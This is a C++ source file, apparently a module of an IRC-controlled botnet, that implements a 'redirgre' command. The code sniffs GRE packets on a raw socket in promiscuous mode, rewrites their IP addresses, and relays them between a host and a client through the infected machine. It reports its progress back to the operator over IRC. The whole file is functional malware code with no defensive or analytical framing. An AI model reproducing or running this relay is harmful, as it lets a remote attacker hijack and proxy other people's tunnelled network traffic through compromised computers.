
#include "main.h"
#include "redir_gre.h"
#include "mainctrl.h"
#include "utility.h"

/*
	This sends a GRE packet using raw sockets
*/

int SendGRE(char *szPacket, int iPacketLen)
{	int sock, iRetVal=SOCKET_ERROR; IPHEADER *ipHeader=(IPHEADER*)szPacket;
	ipHeader->checksum=checksum((unsigned short*)szPacket+sizeof(IPHEADER), iPacketLen-sizeof(IPHEADER));
	sockaddr_in addr_in; addr_in.sin_family=AF_INET; addr_in.sin_addr.s_addr=ipHeader->destIP;

#ifdef WIN32
	BOOL flag=TRUE;
#else
	bool flag=true;
#endif

#ifdef WIN32
	sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED); if(sock==INVALID_SOCKET) return iRetVal;
#else
	sock=socket(AF_INET,SOCK_RAW,IPPROTO_RAW); if(sock==INVALID_SOCKET) return iRetVal;
#endif

	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag))==SOCKET_ERROR) return iRetVal;

	iRetVal=sendto(sock, szPacket, iPacketLen, 0, (struct sockaddr*)&addr_in, sizeof(addr_in)); xClose(sock); return iRetVal; }

void RedirGRE(const char *szHostIp, const char *szClientIp, const char *szLocalIp, bool *pbDoRedir)
{	int sock; sockaddr_in addr_in; hostent *hEnt;
	IPHEADER *ipHeader; char szName[255]={0};
	unsigned long lHostIp=ResolveAddress(szHostIp), lClientIp=ResolveAddress(szClientIp), lLocalIp;
	addr_in.sin_family=AF_INET; addr_in.sin_port=0; addr_in.sin_addr.s_addr=0;

	if(!strcmp(szLocalIp, ""))
	{	lLocalIp=g_cMainCtrl.m_cIRC.m_lLocalAddr;
		if(!lLocalIp || lLocalIp==-1) 
		{	gethostname(szName, sizeof(szName)); hEnt=gethostbyname(szName);
			memcpy(&lLocalIp, hEnt->h_addr_list[0], hEnt->h_length); } }
	else lLocalIp=ResolveAddress(szLocalIp);
	if(!lLocalIp || lLocalIp==-1) lLocalIp=g_cMainCtrl.m_cIRC.m_lLocalAddr;
	addr_in.sin_addr.s_addr=lLocalIp;

#ifdef WIN32
	BOOL flag=TRUE;
#else
	bool flag=true;
#endif

#ifdef WIN32
	sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_IP,NULL,0,WSA_FLAG_OVERLAPPED);
#else
	sock=socket(AF_INET,SOCK_RAW,IPPROTO_IP); 
#endif

	if(sock==INVALID_SOCKET) return;
	if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag))==SOCKET_ERROR) return;
	if(bind(sock, (sockaddr*)&addr_in, sizeof(sockaddr))==SOCKET_ERROR) return;

#ifdef WIN32
	int optval=1; DWORD dwBytesRet;
	if(WSAIoctl(sock, SIO_RCVALL, &optval, sizeof(optval), NULL, 0, &dwBytesRet, NULL, NULL)==SOCKET_ERROR) return;
#else
	ifreq ifr; ifr.ifr_flags|=IFF_PROMISC;
	if(ioctl(sock,SIOCSIFFLAGS,&ifr)==SOCKET_ERROR) return;
#endif

	char szRecvBuf[65535]; ipHeader=(IPHEADER*)szRecvBuf; int iRead;

	while(*pbDoRedir)
	{	// Clear the buffer
		memset(szRecvBuf, 0, sizeof(szRecvBuf)); iRead=0;
		// Read the raw packet
		iRead=xRead(sock, szRecvBuf, sizeof(szRecvBuf));
		// If its a GRE Packet
		if(ipHeader->proto==47)
		{	// If the packet comes from the host ip
			if(ipHeader->sourceIP==lHostIp)
			{	// Set the packet source to local, and the destination to the client
				ipHeader->sourceIP=lLocalIp; ipHeader->destIP=lClientIp;
				SendGRE(szRecvBuf, iRead); }
			// If the packet comes from the client ip
			else if(ipHeader->sourceIP==lClientIp)
			{	// Set the packet source to local, and the destination to the host
				ipHeader->sourceIP=lLocalIp; ipHeader->destIP=lHostIp;
				SendGRE(szRecvBuf, iRead); } } }
	fflush(stdout); xClose(sock); }

CRedirectGRE::CRedirectGRE() { m_sRedirectName.Assign("redirgre"); }

void CRedirectGRE::StartRedirect()
{	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: redirecting from \"%s\" to \"%s\" over \"%s\".", \
								  m_sRedirectName.CStr(), m_sClientAddr.CStr(), m_sServerAddr.CStr(), m_sLocalAddr.CStr());
	RedirGRE(m_sServerAddr.CStr(), m_sClientAddr.CStr(), m_sLocalAddr.CStr(), &m_pRedirect->m_bRedirecting);
	g_cMainCtrl.m_cIRC.SendFormat(m_bSilent, m_bNotice, m_sReplyTo.Str(), "%s: finished redirect from \"%s\" to \"%s\" over \"%s\".", \
								  m_sRedirectName.CStr(), m_sClientAddr.CStr(), m_sServerAddr.CStr(), m_sLocalAddr.CStr()); }
